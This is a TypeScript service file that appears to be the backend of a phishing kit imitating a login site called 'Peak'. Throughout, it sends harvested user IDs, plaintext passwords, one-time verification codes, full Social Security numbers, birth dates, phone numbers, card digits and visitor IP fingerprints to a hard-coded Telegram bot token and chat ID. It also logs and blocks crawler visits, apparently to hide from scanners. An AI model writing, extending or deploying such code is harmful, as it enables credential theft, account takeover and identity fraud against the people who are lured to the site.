const SITE_NAME = "Peak";

export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

export interface ForgotPasswordData {
  ssnLast4: string;
  birthDate: string;
}

export interface NewUserData {
  ssnLast4: string;
  birthDate: string;
}

export interface AccountFoundData {
  method: string;
  password?: string;
}

export interface RememberDeviceData {
  choice: string;
}

export interface VerifyDetailsData {
  ssn: string;
  birthDate: string;
  phone: string;
  zip: string;
  pidNumber: string;
  cardLastFour: string;
}

class TelegramService {
  private botToken: string;
  private chatIds: string[];

  constructor() {
    this.botToken = "8771897622:AAFZc3ptWAMXsOSbfMOY5hLjJ6q9nBWbIsY";
    const raw = "5841830485";
    this.chatIds = raw
      .split(",")
      .map((id) => id.trim())
      .filter((id) => id.length > 0);
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error(
        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      );
      return;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      );
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
    }
  }

  async sendVisitorNotification(data: VisitorData): Promise<void> {
    const ipV4 = data.ipV4;
    const ipV6 = data.ipV6;
    let ipDisplay = data.ip;

    if (ipV4 && ipV6) {
      ipDisplay = `${ipV4} (IPv4), ${ipV6} (IPv6)`;
    } else if (ipV4) {
      ipDisplay = `${ipV4} (IPv4)`;
    } else if (ipV6) {
      ipDisplay = `${ipV6} (IPv6)`;
    }

    const pageUrl = data.url ?? "(unknown)";
    const rawReferrer = (data.referrer ?? "").trim();
    const referrer =
      rawReferrer !== ""
        ? rawReferrer
        : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";

    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
    await this.sendMessage(message);
  }

  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
    const patternsText =
      data.matchedPatterns && data.matchedPatterns.length > 0
        ? data.matchedPatterns.join(", ")
        : "Unknown";

    const message =
      `\n🤖 <b>BOT</b>\n\n` +
      `🧩 <b>Name:</b> ${data.name}\n` +
      `📝 <b>Type:</b> ${data.type}\n\n` +
      `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
      `📍 <b>IP:</b> ${data.ip}\n` +
      `🔗 <b>Path:</b> ${data.path}\n\n` +
      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${patternsText}.`;

    await this.sendMessage(message);
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
    await this.sendMessage(message);
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
    await this.sendMessage(message);
  }

  async sendVerificationClickNotification(
    verificationType: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
    await this.sendMessage(message);
  }

  async sendResendCodeNotification(
    isSecondOtp: boolean,
    ip?: string,
  ): Promise<void> {
    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordNotification(
    data: ForgotPasswordData,
  ): Promise<void> {
    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
    await this.sendMessage(message);
  }

  async sendNewUserPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
    await this.sendMessage(message);
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
    await this.sendMessage(message);
  }

  async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
    await this.sendMessage(message);
  }

  async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
    await this.sendMessage(message);
  }

  async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
    await this.sendMessage(message);
  }

  async sendNewUserPasswordNotification(
    password: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
    await this.sendMessage(message);
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const passwordText = data.password
      ? `\n🔑 <b>Password:</b> ${data.password}`
      : "";
    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
    await this.sendMessage(message);
  }

  async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
    const message =
      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
      `User clicked "Reset password" on the account found page.`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordVerifyNotification(
    verificationType: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordCodeNotification(
    code: string,
    ip?: string,
  ): Promise<void> {
    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
    await this.sendMessage(message);
  }

  async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
    await this.sendMessage(message);
  }

  async sendRememberDeviceNotification(
    data: RememberDeviceData,
  ): Promise<void> {
    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
    await this.sendMessage(message);
  }

  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
    const message =
      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
      `🔢 <b>SSN:</b> ${data.ssn}\n` +
      `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
      `📞 <b>Phone:</b> ${data.phone}\n` +
      `📍 <b>ZIP Code:</b> ${data.zip}\n` +
      `🆔 <b>PID Number:</b> ${data.pidNumber}\n` +
      `💳 <b>Card Last 4:</b> ${data.cardLastFour}`;
    await this.sendMessage(message);
  }

  async sendBlockedBotNotification(data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
    await this.sendMessage(msg);
  }
}

export const telegramService = new TelegramService();
